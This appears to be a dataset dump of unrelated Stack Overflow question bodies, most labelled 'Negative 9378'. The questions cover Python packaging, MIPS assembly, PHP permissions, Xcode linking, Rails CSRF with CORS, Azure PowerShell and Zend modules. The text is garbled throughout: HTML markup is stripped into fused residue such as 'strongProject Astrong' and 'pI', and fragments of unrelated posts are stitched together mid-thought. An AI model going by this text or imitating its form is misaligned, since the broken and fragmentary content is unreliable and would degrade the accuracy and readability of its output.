Each tab shows the course and lesson details of upcoming lessons where the left most tab is the one with the lesson that will start the soonest. p  pOur problem are the tabs itself and the space it takes. This is because the name of each tab corresponds to the name of our courses...which can get very long. Lets say we have we ten courses all with long names.

Negative 9378 pI generally dont bother to install Python modules. I use web2py, and just dump them in the modules folder and let it take care of the local imports. It just always seemed like the most straightforward way of doing things never felt right about handling dependencies at a systemwide level, and never felt like messing with virtual envs.p  pOn a hrefhttpstackoverflow.coma10761118165673one of my other questionsa, the answerer said p  blockquote   pGenerally, the best practice for 3rd party modules is to install them   via pip or easyinstall preferably in a virtualenv, if theyre   available on PyPI, rather than copying them somewhere onto your   PYTHONPATH. ... [because that] runs the install scripts hooks   necessary to install executable scripts, build C extensions, etc.,   that isnt done by just copying in a module.p blockquote  pI dont fully understand this. I always thought it was more of a preference, but is it true that its better practice to install 3rd party modules, and am I potentially causing problems by not doing that  Does using a framework like web2py make a differencep

Negative 9378 pIm working on a little arithmetic project with roman numerals pretty simple, except that its on a MIPS machine... Anyway, what the program will do is basically read the input roman numeral, convert it to a regular INT, perform the requested operation and return the answer as a roman numeral. Not far into the program, Ive run into my first obstacle... How to compare the character values to numbers efficiently... The program first reads the whole number as a string of characters using syscall 8, then I can check the individual letters by using a counter to move through the array...  Now that I have a single character, I need to turn it into a number, but I dont want to make a branch for each exception, as the program would be far too inefficient... Any suggestionsp

Negative 9378 pI am very new to web coding about a week or so but am making great strides.  Ive run into a problem that Im not sure will be a big issue or not.p  pIm building a website to showcase my photography www.MattTilghman.com  VERY much a work in progress.  Uploading the files manually and editing all the html files accordingly will be very annoying and time consuming, so Ive decided to write a PHP script which will help me streamline the process.p  pThis PHP file has not made it online yet, Im doing all my testing locally first.  Right now it does exactly what Im asking it to though its not finished, so you might see some hanging chads in the code.p  pBasically right now, when I select the file names, it moves them from their original folder, to the one I specify, which is located somewhere in the wampwwwhtdocs etc.  It then edits the html files to add code which points to this image, and low and behold, the new html files do exactly as I want, and show the images fine.p  pHOWEVER, if I navigate to the copies of the images within the wamp server directory, they cannot be opened by any program.  I guess the html is displaying them fine, but every other program gives me an access denied error.  How do I avoid this  Is there some sort of access permission I need to set in the PHP file  Will any of this be a problem once I move the file onlinep  pAs I said, Ive only been doing this about a week, so be gentle.  Im a quick learner, but nonetheless, it would be appreciated if answers were as explicit as possible.p  pThanks so much and please let me know if yall need anything else.

Negative 9378 pI currently have a single Xcode project for a very large code base, Ill call it strongProject Xstrong, which I am dividing into a bunch of sub projects  strongProjects A, B, Cstrong .p  pSo far, each of these projects compiles, on their own, just fine. They all produce static libraries. strongProject Bstrong and strongProject Cstrong are dependent on the static library produced by strongProject Astrong in order to build.p  pI have another xcode project, strongProject Zstrong, that requires the static libraries produced by strongProjects B and Cstrong. Herein lies the problem. When strongProject Zstrong enters the linker phase, things blow up  duplicate symbols are found within the libs for strongProjects B and Cstrong for the code they originally linked against in strongProject Astrongp  pIm pretty new to the world of static libraries, and Im unsure of how to move forward with strongProject Zstrong, or how to modify the other projects so that they are linking against the same strongProject Astrong lib. I have a feeling its not possible. What are my options herep  pEditp  pI should clarify that strongProject Bstrong and strongProject Cstrong need to build into separate static libs because some clients will only require one or the other.p  pAlso, Im having this dilemma on both OSX and iOS platforms.p  pI realize that I could solve this problem on OSX by building the projects as dynamic libraries. However, Id prefer not to do this, and it still leaves me with same issue on iOS.p

This class contains the necessary information to display a complete Scale around a GDI drawn Gauge.p  pI have a Gauge control which uses a GaugeDrawer to render its frame.p  pThe GaugeDrawer are Components which can be used at Designer time like regular componentsp  pThe frame can be rendered by either a CircularGaugeDrawer makes a fancy car RPM gauge or by a ThermometerDrawer... p  pAnyway, both uses GaugeScale which have some complex properties GaugeScaleInterval[] and float and I would like to know if there is a way to allow the Designer of Visual Studio to instantiate and display those properties. It would make the creation of this control way less complex to the users.p  pSo Im wondering how could I teach the Designer how to use the Drawer components. If TypeConverter are the solution. How can I make them useful to the Designer of Visual Studiop  pEDITp  pThis whole stuff targets WinForm environment.p

What does codestdstringcode do to achieve such fast deallocation, considering that codestrungcodes destructor is almost trivial.p  pAt first I thought that codestdstringcode is optimized into a nop, so deallocation is not performed at all, but when I removed codestrungcodes destructor, the latter was still much faster, so this is probably not a case.p  pI would like my deallocation to be fast, so what am I to do achieve similar deallocation speedsp

What is the reason behind it Do I need to run the web service call in a separate thread Please help.

It works fine now. Maybe the proper implementation for this is to do the task in background or in a separate thread and set the timeout which I do not have a knowledge on it yet.

Should I set the deviceside to true when Im running my app in a simulator then just change it to false if I want it to run in an actual device That is for me to discover for now or you can help me out on this one as well. p

Then Id like to be able to do a local search with the results.

Negative 9378 pWith the advantages of async IO and it now being quite easy to code and compose using Await and the TAP methods I am wondering, if we should use async by default and only tune for performance by using sync when needed. p  pAsync IO frees the calling thread and allows to do something else while waiting for the result. On the other hand async IO is a little slower than sync.p  pTo enforce responsive UIs the WinRT designers found it acceptable to offer asynconly methods. p  pAFAIK Windows file IO internally is async. Looking at this naively it is not clear to me, why async file iO in .NET should be slower than sync at all.p  pI generally favor simplicity and robustness and only tune for performance where necessary. In the past we used sync by default with the exception of calling some services and where platforms like the phone enforced async. We rarely tuned by using async. p

Negative 9378 pI have a single page app that authenticates to another domain using CORS. All the requests are JSON requests.p  pMy app can authenticates OK and can make GET requests OK.  Authentication is using tokenauthenticatable. I.e. all requests append  authtokenwhateverp  pSo, my actual problem is that when I try to do a PUT request I get a strongWARNING Cant verify CSRF token authenticitystrong message in the rails log as well as a strongCanCanAccessDenied You are not authorized to access this page.strong exception.p  pSimply adding codeskipbeforefilter verifyauthenticitytokencode to the rails controller fixes the issue.p  pTherefore I can only conclude that my ajax requests are sending an invalid or empty csrftoken.p  pI dont really understand how that can be, since I believe I am correctly sending the XCSRFToken header correctly with each ajax request.p  pBasically, my app authenticates and Devise sends back an authtoken and a csrftokenp  precoderender status gt 200, json gt    authtoken gt user.authenticationtoken,   csrftoken gt formauthenticitytoken  codepre  pI then store those tokens in my ajax app, and using codeajaxSendcode in jQuery, set it up so jQuery passes those tokens with each requestp  precodeinitialize gt   bindTo document, ajaxSend, appendTokensToRequest  appendTokensToRequest event, jqXHR, options gt   if not authToken then return    if csrfToken     jqXHR.setRequestHeader XCSRFToken, csrfToken    if options.type is POST     options.data  options.data  if options.data.match then amp else       .param authtokenauthToken   else     options.url  options.url  if options.url.match then amp else       .param authtokenauthToken codepre  pI can then see in the chrome network tab, that for each GET request the codeauthtokencode param is being sent, as well as the codeXCSRFTokencode header.p  pOn PUT requests however it doesnt seem to be working though.p  pMy theory is that CORS is stuffing things up. If you make a CORS request, your browser actually makes an strongadditionalstrong OPTIONS request first just to check that you do have permission to access this resource.p  pI suspect that it is the OPTIONS request which is not passing the XCSRFToken header, thus rails immediately invalidates the csrftoken on the rails end. Then when jQuery makes the actual PUT request the csrftoken it passes is no longer valid.p  pCould this be the problemp  pWhat can I do to prove that Chrome doesnt seem to show me the OPTIONS requests in the network tab to help me debug the issue.p  pIts not a major issue, because I can just turn the CSRF stuff off. But Id like to know why its not working.p

Negative 9378 pI have an array, say, text, that contains strings read in by another function. The length of the strings is unknown and the amount of them is unknown as well. strongHow should I try to allocate memory to an array of stringsstrong and not to the strings themselves, which already exist as separate arraysp  pWhat I have set up right now seems to read the strings just fine, and seems to do the postprocessing I want done correctly I tried this with a static array. However, when I try to printf the elements of text, I get a segmentation fault. To be more precise, I get a segmentation fault when I try to print out specific elements of text, such as text[3] or text[5]. I assume this means that Im allocating memory to text incorrectly and all the strings read are not saved to text correctly p  pSo far Ive tried different approaches, such as allocating a set amount of some codesizetk , ksizeofcharcode at first, and then reallocating more memory with coderealloc ksizeofchar if cnt  k2code, where cnt is the index of text. p  pI tried to search for this, but the only similar problem I found was with a set amount of strings of unknown length.p  pId like to figure out as much as I can on my own, and didnt post the actual code because of that.

The client applications are signed with the same signature as the service app. Currently the apps just bind to the service and call a single interface method to perform various operations.p  pOne option is broadcasting an Intent from the service when the operation is complete and using a BroadcastReceiver in the client application, but strongQuestion 1strong can this be done in a way that ensures only my apps can receive the Intent setPackage seems to do this, but I need to support Gingerbread devices, which seems to rule out that approach according to the answer here a hrefhttpstackoverflow.comquestions9370587setpackageforintentingingerbreadsetPackage for intent in gingerbreadap  pSo it seems I need to add a second .aidl interface with the callback interface for the service to use, implemented by the client.

Negative 9378 pI am trying to connect to a database on my website from a java applet.

Negative 9378 pI am using ActionBarSherlock, along with several codeMenuItemcodes that I dynamically manage, depending on program state.  Specifically, I save the codeMenuItemcodes into instance variables in the codeActivitycodes codeonCreateOptionsMenucode method, and then can show andor hide them as needed later in the codeActivitycode.p  pHowever, I found that the codeMenuItemcode variables can be lost on configuration changes, such as device rotation.  So I also put them into a codeParcelcode and pass them to codeonSaveInstanceStatecode for restoral through the codesavedInstanceStatecode mechanism in the next codeonCreatecode call, if needed.p  pThis seems to work fine in the case of a device rotation.  However, if I press the Home button, I get an errorp  precodeUnable to marshal value com.actionbarsherlock.internal.view.menu.MenuItemWrapper codepre  pAny idea whats the difference, or suggestions how to fix  Thank youp  pstrongUPDATEstrongp  pI found a simple solution using a hrefhttpdeveloper.android.comreferenceandroidsupportv4appFragmentActivity.htmlonRetainCustomNonConfigurationInstance2829 relnofollowcodeonRetainCustomNonConfigurationInstancecodea.  By overriding this method you can stash an object of a class of your choice when an codeActivitycode is being destroyed, and then retrieve it using codegetLastCustomNonConfigurationInstancecode.

Negative 9378 pI have a VS 2012 MVC 4 web role project and I successfully call a powershell script from the bin directory of the role, after I run codeSetExecutionPolicy Unrestrictedcode from a startup cmd. The script contains some azure cmdlets and when I run the project locally the script works perfectly. However when I publish the project on Azure, the same azure cmdlets in the script do not run. For examplep  precodeparam[string]websiteNameitudkcloudqwerdfs, [string]serverLoginuser, [string]serverPasspaSS123, [string]locationNorth Europe   Create new Website   website  NewAzureWebsite Location location Name websiteName  if website eq null      throw Website creation error     exit  codepre  pcreates an Azure website successfully when run locally but throws and exits when published and run from the cloud service.p  pOf course I googled around for a solution and I found that I have to preinstall Azure Powershell to the Web Role in order to run Azure cmdlets there. To do that, I installed the web platform installer 4.5, copied its command line tool executable with the Microsoft.Web.PlatformInstaller dll and my Azure publishsettings file to my Web Roles bin folder and I created a cmd that installs the Azure Powershell from webpicmd to a special folder in the Web Roles bin directory and imports my publishsettings file on Web Role startupp  precodemd dp0appdata cd dp0appdata cd..  reg add hku.defaultsoftwaremicrosoftwindowscurrentversionexploreruser shell folders v Local AppData t REGEXPANDSZ d dp0appdata f  dp0WebpiCmd.exe Install AcceptEula ProductsWindowsAzurePowershell logdp0WindowsAzurePowershell.log  reg add hku.defaultsoftwaremicrosoftwindowscurrentversionexploreruser shell folders v Local AppData t REGEXPANDSZ d USERPROFILEAppDataLocal f  powershell ImportAzurePublishSettingsFile exit b 0 codepre  pIt still didnt work, so I remotely logged in to the instance to see for myself what could be wrong. I tried to run the cmd script above and it required the .NET Framework 3.5 feature enabled, which looks weird to me since the instance already has the .NET 4.5 feature enabled by default Windows Server 2012. Anyway, I enabled it from the server manager and the script ran successfully with no errors. I opened the powershell and I tested some Azure cmdlets and they worked.

Negative 9378 pGood day,p  pI wonder if it is possible to implement the following. For example, we have 2 indicesp  p1 Id, A, B, C, f1, f2. 2 Id, f3.p  pwhere  fn  rtfield.

Ids in the 2nd index are a subset of ids from the 1st one.p  pThe goal is to query both indices and get results in such form Id, A, B, C , that will include matches from both indices but without repeats. p  pSo, the main point is to fill up results from 2nd index with attributes A, B, C from corresponding documents with the same ids from 1st index. Can it be done on the Sphinx layerp  pIf no, then another question. For example, we have 2 indicesp  p1 Id, A, B, C, f1, f2. 2 Id, A, B, C, f3.p  pwhere  fn  rtfield. A, B, C  attributes to return. Ids in the 2nd index are a subset of ids from the 1st one.p  pCan we query both indices and get results in such form Id, A, B, C , that will include matches from both indices but without repeats p  pAs far as I know we can query several indices and results from the last index will overwrite results with the same ids from the previous indices, but will it work if indices have different structuresp

Negative 9378 pBasically, I have not been able to find much information about this on the internet, but I understand that the basic class instantiation is  operator new  allocates memory from somewhere  constructor  assigns values to data typesp  pNow, what I want to know is, how does C allocate methodsfunctions of the class rather than its members.  According to my web research, this cannot happen in new because it is only allocating raw memory, and as far as I have gotten, I have not quite been able to figure out how this could be done in the constructor with functions rather than function pointers.  Also, I assume that because of the existence of the keyword static, without this keyword, it is allocated as part of the parent class.  How and where does this happen  p  pAlso, if the functions are included in the memory of the class, does the function sizeof give the size of just the class and its members, or does it also include the related functions p

Negative 9378 pI have a json function that connects to a database and returns a result. It does this about 15 times or for how many comments there are in the database. The json function is inside a while loop, and repeats itself until all the comments have been taken from the database or until it reached 15 comments.

Negative 9378 pIm in a situation where I have a codeBagcode that has a codeAddSlotcode method inside. I have two types of bags, codeItemsBagcode and codeDCBagcode stands for draggable content codeItemsBagcode is a 2D bag meaning it has rows and columns, codeDCBagcode is 1D, it has only one column but many rows Which means I can consider it 2D as well.p  pNow the thing is, since the first bag deals with 2D indices, I would want codeAddSlotcode signature to be something like thisp  precodepublic void AddSlotint r, int c codepre  pAnd the other bags codeAddSlotcodep  precodepublic void AddSlotint r codepre  pHow can I write a virtualabstract signature of codeAddSlotcode in codeBagcode such that when codeItemsBagcode and codeDCBagcode inherit from codeBagcode they can override the signature in the way I mentioned abovep  pAs I said, I can consider the codeDCBagcode to be 2D as well, so that both it and codeItemsBagcode have the same signature, but I really want to know if I could do this, its very interesting.p  pI could get away using a variable number of arguments codeparams obejct[] argscode but it would be nice to do it in a way that doesnt involve boxingunboxing.p  pI could also make a codeTwoDimBagcode and codeOneDimBagcode make them both inherit from codeBagcode, write the definitions of codeAddSlotcode in them the way I want to, and then make codeItemsBagcode inherit codeTwoDimBagcode and codeDCBagcode inherit codeOneDimBagcode, but Im not looking for workarounds more than how to achieve what Im asking for.p  pAgain to recap one last time how can I write a signature that I could override in the inheriting children that is, if I can and there is a wayp  pThanks.p  pEDIT Extra Info The codeBagcode has a lot of functionality in it. The difference between the two bags is that codeItemsBagcode holds a 2d List of Slot codeListltListltSlotgtgtcode, while codeDCBagcode has a 1d codeListcode of codeSlotcode. Its the codeSlotcode that holds an codeItemcode.

Negative 9378 pLooking at Mailcore docs, I see a method to retrieve the sequence number of an email or emails by executing a fetch using the email UID.  However, when looking at the Mailcore2 docs, I dont see any way to accomplish this.  Is there a method for this in Mailcore2 that I am somehow not seeing, or a way to bubble up this information I know it is possible in the command line, but Id like to be able access it from inside my iOS app.p  pstrongEDITstrongp  pemstrongHere is why I am looking for this functionalityemstrongp  pWe have a native iOS client that fetches the 10 newest emails at a time and saves them. Additionally, the client will fetch the next 10 older emails at a time and save them, as well as the lowest UID it has seen minUID.p  pSo we need to be able to continually fetch the next 10 older emails that exist on the server that the client has not yet stored or seen. Therein lies the challenge.p  pInitially, we did this by fetching emails by UID in groups of 10, using our saved minUID minus 1 as the starting point for each fetch, and updating our minUID at the end of each fetch. However, as UIDs are not necessarily contiguous, the number of emails that was returned was inconsistent, and sometimes zero. To solve this problem, we thought it would be helpful to before each fetch for the next 10 older emails, fetch the email with our stored minUID, check its current sequence number, and then fetch the next 10 older emails based on that sequence number.p
Negative 9378 pIm developing an Android app which interacts with other devices using NFC. This interaction consists of 2 steps basicallyp  ol liWhen the device receives a specific URI by NFC from other device, the app is launched.li liWhen the app starts, it sends a NDEF message back to the other device.li ol  pFor the first step, I have added the following lines to the emAndroidManifest.xmlem file. That way, the codeMainActivitycode will be launched when the device receives a URI of type codemyprotocolsomethingcodep  pre classlangxml prettyprintoverridecodeltintentfiltergt      ltaction androidnameandroid.nfc.action.NDEFDISCOVERED gt      ltcategory androidnameandroid.intent.category.DEFAULT gt      ltdata androidschememyprotocol gt  ltintentfiltergt codepre  pFor the second step, my codeMainActivitycode class implements codeCreateNdefMessageCallbackcode and codeOnNdefPushCompleteCallbackcode. The code looks like followingp  pre classlangjava prettyprintoverridecodeOverride protected void onCreateBundle savedInstanceState      super.onCreatesavedInstanceState     setContentViewR.layout.activitymain      NfcAdapter adapter  NfcAdapter.getDefaultAdapterthis     adapter.setNdefPushMessageCallbackthis, this     adapter.setOnNdefPushCompleteCallbackthis, this   Override public NdefMessage createNdefMessageNfcEvent event      NdefRecord uriRecord  NdefRecord.createUriprotocolsomething     NdefMessage message  new NdefMessagenew NdefRecord[]  uriRecord      return message   Override public void onNdefPushCompleteNfcEvent event    codepre  pSo, now strongthe problemstrongp  pThese two parts work fine independently, but not when I add both to the app. p  pThat is, if I add the first part, the app is correctly launched when receiving the NDEF message. Also, if I only add the second part, if I tap my device to other device while running the app, I see emTouch to beamem interface, and the NDEF message is sent.p  pThe problem is, that if I add both, when tapping to the other device, the app is launched, but the emTouch to beamem interface is never shown. If I separate the devices and tap again, the codeMainActivitycode is relaunched, but I never get to see the option to send the message.p  pHow could I achieve the desired scenariop

If I run something else which does not use LWJGL it works, too. I just downloaded it from the internet  it only had one version, so I assume it was the correct one. From what I can see, none of the other question askers have the same error as me  but if you could point me to informative questions that would be helpful too.p

Negative 9378 pIm kinda new to this WPF world. And Im kinda confused on why my scrollview is consuming my touch event.p  pMy current situation is thisp  pI have this ScrollViewer with an ItemsControl. In this ItemsControl Im using a Wrappanel to show a number of Rectangles. My ScrollViewer should make it possible to scroll vertically to show the Rectangles that are wrapped downward. On each of these Rectangles I made a CustomBehaviour with all kinds of handlers. One of these handlers is a creatively made way to handle LongPressGestures.p  pThe problem is as follows, before my longpress is detected by the behaviour, my ScrollViewer is capturing my TouchDevice in its PreviewTouchMove handler.p  pHow can I prevent my ScrollViewer from capturing my TouchDevice too early How can I make sure that I can scroll my ScrollViewer and do my LongPress, DoubleClick which still works, SingleClick which still works as well and other gestures I might add to this custom behaviourp  pIve found similar questions on stackoverflow and google that I just not figure out for my specific case.p  pa hrefhttpstackoverflow.comquestions8369040sliderscrollviewerinatouchinterfacenotworkingproperlySomething with a CustomThumba lt This link solves the problem by making a CustomThumb.

I got the longpress to work now from my CustomBehaviour while the UIElements with that behaviour are located on a ScrollViewer. However the scroll functionality of the ScrollViewer still does not work. The bounty I added will also be awarded to the person that helps me get that to work properly again since the answer should lie in the same direction as this CustomThumb solution. p

Negative 9378 pIm a C novice and hoping someone can help me. I have two devices that act as either a clientserver or serverclient pair.  It depends upon who is performing HTTP POSTs to the other device.  Im implementing HTTP POST code for when the device is acting as a client.  Im also implementing HTTPListener code for when  the device is acting as the server.p  pId like the HTTPListener to run concurrently with the HTTP POST code while it is making periodic POSTs.  Im not sure how the  HTTPListener listens for incoming POSTs.  It appears to make the program wait until a preferred URI is recognized.  It then appears to accept the other devices request and POST data.p  pShould I put the HTTPListener within and event handler that is triggered anytime during program execution  I believe this would  pause the current program execution inorder to execute the HTTPListener code.  After the listener code is completed, the program  should resume where it intially left off.  Do I understand this correctly  p  pBelow is some of my code simplified to illustrate.

The server wouldnt need to load or generate any part of the planet in this case.p  pA planet would have far too many vertices for unity though, so if i were to build it in blender as a multitude of smaller objects could these be loadedunloaded as the player moves along the planetp  pand I understand this might be a little too far out but, can the models be changed in game and saved say if I placed a building somewhere on the planet, then send this detail over to current and new players.p  pThaaanksp

But having spent a couple of hours just noodling around and trying all the other ways I could think of using flags, for example, I just couldnt make it work. It works for y, but as soon as I enter n, it doesnt quit and just calls the playAgain function one more time, or freezes altogether nothing happens. p  pI feel ashamed for not being able to solve this, but Im out of ideas. Is there any other way, other than exit0, to make it jump out of play straight to return 0 in main The problem seems to be that I have an infinite game loop, so when the answer is n, I need to break out of the loop AND out of the play function, and that has proven to be problematic. I remember being able to do this easily when I had no functions, but just all the relevant code in main, but the whole point of this is to use functions. For example, I cant figure out how to make use of a return type of play, so that it knows when to quit. p  pP.S. As always, seeing how often people get accused of this, I assure you this is not homework because I am, and always have been, doing programming strictly as a hobby. Theres no professor I answer to, apart from you  And trust me that I did try to figure out a solution, but nothing seems to work. Its a question of good vs. bad design, so its especially important for my selfteaching. exit0 seems to be a hackish solution and serves no educational purpose. p  pP.P.S. By the way, Im using xCode, and the program runs in its output window. Probably not, but maybe thats the reason quitting with n doesnt work p  pSUMMARY The code works fine except when the answer is n, in which case it just asks Do you wanna play again, or doesnt do anything at all. p

Negative 9378 pI would like to implement a leaderboard on the website, which will show users who did particular action for simplification, lets say  button click more often during the previous week. I am trying to understand what is the best approach to count number of actions and send it to the server. p  pThe first question I see is time difference. How to count previous week on the client side p  pThe second question is how to send the data to the server I dont care too much about data security, so it could be send as open text I am OK that some users may hack that. But I am care about strongwhenstrong the data should be sent. Per current synchronization process, the data is sent tofrom the server when user is online and not more than once per day. If I follow the same approach, then leaders could be identified lets say on Wednesday  once week is passed and 2 days are given for the data sending if counting happens on the client side.p  pThe third question is how to store this data on the client side. SQLite looks too complicated for this simple task.p  pAny ideas how to deal with this taskp

Negative 9378 pIm trying to create a column of text, consisting of a series of blocks of text, where one of the blocks has a coloured background which reaches outside the column. Id like to do this in two different ways, first where the text layout is unaffected, second where there is extra bounding spacep  pimg srchttpi.stack.imgur.comCKjpm.png althttpi.imgur.comUJWiNwk.pngp  pI suspect this should be a lot easier than Im making it.p  pIve been trying to do the first by surrounding each block with a div element, with a margin of 10px, and then for the highlighted block, setting a margin of 0px, and padding of 10px.p  pThis works well for normal paragraphs. The problem is, when the block of text starts with a heading say, an h3 heading, padding for the bottom, left and bottom works well, but the top padding adds more than is wanted, and it cant even be manually tweaked, because theres a very large jump between paddingtop1px and paddingtop0px.p  precodelthtmlgt ltbodygt     ltdiv classblockgt         ltpgt         Test Test Test Test Test Test         ltpgt     ltdivgt     ltdiv classblock test2blockgt         lth3gtTest Titlelth3gt         Test2 Test Test Test Test Test     ltdivgt     ltdiv classblockgt         ltpgt         Test3 Test Test Test Test Test         ltpgt     ltdivgt ltbodygt ltstylegt     .block          margin10px          .test2block          backgroundcolorgreen         margin0px         paddingright10px         paddingleft10px         paddingbottom10px         This value cant be tweaked manually, try 0, 1, and 10 pixel values         paddingtop10px      ltstylegt lthtmlgt codepre  pIm not sure at all how to go about the undisturbed layout. Could someone give me a pointerp  pEdit Thanks to aaronegan and sfyn below, thats the solution for the extra bounding space right hand on picture. If anyone knows how to maintain an undisturbed layout left hand on picture, that would be superb. Does this require the same sort of trick  manually altering the marginbottom for the paragraph above the highlighted block, and margintop for the paragraph below I was hoping to be able to do this dynamically  to add a flashthenfade background when scrolling to an anchor link. You could dynamically alter both the block itself, the paragraph below, and the paragraph above, but it seems awkward.p

Negative 9378 pI have written a unit test that uses a CSV file to read in data using the DataSource and DeploymentItem Attributes pointing to a csv file in a subfolder.  However, when initially building the project the files are deployed in two different locations, one in the root and the other in the subfolder. When I then later change the CSV file with different data and save and rebuild the project having the CSV property Copy to Output set to Copy always, just to make sure, it copies the changes to the correct output subfolder but not the root.  This is what I would expect but the problem is, that when running the tests, it still reads in old data because it picks the CSV file up from the root and not the subfolder.

Then, it wouldnt make much sense if the results came out randomized, and not in the same order, such as p  pcode[ country[1], oilprice[1], vesseltype[1] ]code first passp  pcode[ vesseltype[2], country[1], oilprice[1] ]code second passp  pThe code below does take the element position in codearrcode into account and creates the resultspace I would like, but requires a for loop for each element, which is what I am trying to avoid as the number of elements in codearrcode could vary from time to time.p  precodefunction resultspacearr results  [] eid  1 for count1  0 count1 lt arr[0].length count1     for count2  0 count2 lt arr[1].length count2         for count3  0 count3 lt arr[2].length count3             for count4  0 count4 lt arr[3].length count4                 for count5  0 count5 lt arr[4].length count5                     for count6  0 count6 lt arr[5].length count6                         id  eid                         var1  arr[0][count1].value                         var2  arr[1][count2].value                         var3  arr[2][count3].value                         var4  arr[3][count4].value                         var5  arr[4][count5].value                         var6  arr[5][count6].value                          resultinstance  ideid,                                             VAR1 var1,                                              VAR2 var2,                                              VAR3 var3,                                              VAR4 var4,                                              VAR5 var5,                                              VAR6 var6                                                                      results.pushresultinstance                         eid                                                                  returnresults   codepre  pI have looked into recursive combination generation a hrefhttphengruili.blogspot.no201105generatecombinationsofelementsfrom.html relnofollowherea and a hrefhttpstackoverflow.comquestions4331092findingallcombinationsofjavascriptarrayvaluesherea, but I havent been able to take the element position of the input array into account using these methods.p  pThank you for reading.p

I have tried solutions like a hrefhttpstackoverflow.comquestions22772379updatinguifromdifferentthreadsinjavafxusing message queues with an AnimationTimera. It works but it slows the GUI down.p  pI also tried using a a hrefhttpdocs.oracle.comjavase8javafxapijavafxconcurrentScheduledService.html relnofollowscheduled servicea which runs a thread that reads messages from the message queue, concatenates them, and appends them to TextArea codetextArea.appendTextstringBuilder.toStringcode. The problem is that the TextArea control goes unstable i.e. you had to highlight all texts with codeCtrlAcode and try resizing the window to make them appear well. There are also some of them being displayed in a lightblue background not sure whats causing it. My first guess here is that the race condition may not be allowing the control to update itself well from the new strings. It is also worth noting that the textarea is wrapped around a ScrollPane so it adds the confusion if TextArea is actually the one having the problem or ScrollPane. I have to mention as well that this approach doesnt make the TextArea control update itself with messages quickly.p  pI thought about codebindingcode codeTextArea.TextPropertycode to something that does the update but Im not sure how I would do that properly knowing that the gatherer of messages be it by a service or a lone thread would still be running different from the GUI thread.p  pI have tried to look up on other known logging framework solutions like log4j and some stuffs referred a hrefhttpstackoverflow.comquestions5950557goodexamplesusingjavautilloggingherea but none of them seems to give an apparent approach to logging via threads to TextArea. I also dont like the idea of building my logging system on top of them as they already have their predefined mechanisms like logging level, etc.p  pIve seen a hrefhttpstackoverflow.comquestions10785560writeloggermessagetofileandtextareawhilemaintainingdefaultbehaviourinthisa as well. It implies using codeSwingUtilities.invokeLaterRunnablecode to update the control but I already tried a similar approach using codejavafx.application.platform.runLatercode which gets executed on the worker thread. Im not sure if there was something I was doing wrong but it just hangs. It can produce messages but not when theyre aggressive enough. I estimate that the worker thread running in a purely synchronous fashion can actually produce about 20 or more average lines per second and more when its in debug mode. A possible workaround would be to add message queueing to it as well but that doesnt make sense anymore.p

Negative 9378 pI created a new web application containing MVC5 and WebAPI. Now I added a new APIController and added an AuthorizeAtribute System.Web.Http.

Negative 9378 pIm wondering if its possible to put together a fully nonblocking Clojure backend web application with httpkit.p  pActually any Ringcompatible http server would be fine by me Im mentioning httpkit because it a hrefhttphttpkit.orgserver.htmlclaimsa to have an eventdriven, nonblocking model.p  pIf I got it right and Im not an expert, so please tell me if Im working on wrong assumptions, the principles of such a nonblocking model for a web application are the followingp  ol liHave a few superfast OS threads handle all the CPUintensive computing these emmust never be waitingem.li liHave a lot of weak threads handle the IO database calls, webservice calls, sleeping, etc. these emare meant mostly to be waitingem.li liThis is beneficial because the waiting time spent on the handling of a request is typically 2 disk access to 5 web services calls orders of magnitude higher than the computing time.li ol  pFrom what I have seen, this model is supported by default on the a hrefhttpwww.playframework.comPlay Frameworka Scala and a hrefhttpnodejs.orgNode.jsa JavaScript platforms, with promisebased utilities for managing asynchrony programmatically.p  pLets try to do this in a Ringbased clojure app, with Compojure routing. I have a route that constructs the response by calling the codemyhandlecode functionp  precodedefroutes myroutes   GET myurl req myhandle req    def myapp noir.util.middlewareapphandler [myroutes] defn startmyserver []    httpkitrunserver myapp codepre  pIt seems the commonly accepted way of managing asynchrony in Clojure applications is CSPbased, with the use of the a hrefhttpsgithub.comclojurecore.asynccore.asynca library, with which Im totally fine. So if I wanted to embrace the nonblocking principles listed above, Id implement codemyhandlecode this way p  precoderequire [clojure.core.async as a]  defn myhandle [req]   alt     ago  go makes channels calls asynchronous, so Im not really waiting here      let [mydbresource athread fetchmydbresource  thread will delegate the waiting to weaker threads            mywebresource athread fetchmywebresource]        constructmyresponse alt mydbresource                               alt mywebresource       codepre  pThe CPUintensive codeconstructmyresponsecode task is performed in a codegocodeblock whereas the waiting for external resources is done in codethreadcodeblocks, as suggested by Tim Baldridge in a hrefhttpswww.youtube.comwatchvenwIIGzhahwthis video on core.asynca 3855p  pBut that is not enough to make my application nonblocking. Whatever thread goes through my route and will call the codemyhandlecode function, will be strongwaitingstrong for the response to be constructed, rightp  pemWould it be beneficial as I believe to make this HTTP handling nonblocking as well, if so how can I achieve itemp  hr  pstrongEDITstrongp  pAs codemomentum pointed out, the missing ingredient for a nonblocking handling of the request is to use httpkit channels. In conjunction with core.async, the above code would become something like this  p  precodedefn myhandle [req]   httpkitwithchannel req channel     ago       let [mydbresource athread fetchmydbresource            mywebresource athread fetchmywebresource            response constructmyresponse alt mydbresource                                            alt mywebresource]        send channel response        close channel       codepre  pThis lets you embrace an asynchronous model indeed.p  pThe problem with this is that it is pretty much incompatible with Ring middleware. A Ring middleware uses a function call for obtaining the response, which makes it essentially synchronous. More generally speaking, it seems eventdriven handling is not compatible with a pure functional programming interface, because triggering events means having sideeffects.p  pId be glad to know if there is a Clojure library that addresses this.p

Negative 9378 pI am currently building a Theme Manager where each theme are in module format. These themes are added  in the modulelisteneroptions  modulepaths but not in modules in the application.config.php.p  pNow, based on the data coming from the database, I want to activate the relevant theme module and enable its controller, servicemanager,  and other plugin manager keys, just like any other modules that were added in the application.config.phpp  pI read it online that you can add dynamic configuration using the configMerge event listener ConfigListener in ModuleManager, but the ServiceManager and the ThemeManager module the module that allows to activate certain themes is not yet fully loaded as the mergedConfig has not gone through ServiceListener yet.p  pAnother suggestion I read is to enable all the modules and then disable the features using listeners. This, I am not sure how to do or if  it actually meets my requirement as there could potentially be a huge number of features per theme module.p  pCan you dynamically enable modulesp  pAlso, some theme modules are child themes where they inherit the functionality of their parent theme module. I have done the inheritance of the templatepathstack and templatemap in viewmanager for this, but couldnt do the rest, eg navigation. Did this in loadModules.post event listener within the ThemeManager Moduleinit class.p  pI like the idea what WordPress does  with its templatestheme where extra functionality is enable when the theme is activated. Is there anything close to that in ZF2p  pIf you know any links, readings and pointers that I could potentially have not seen yet, suggestions are very welcomep  pThank youp

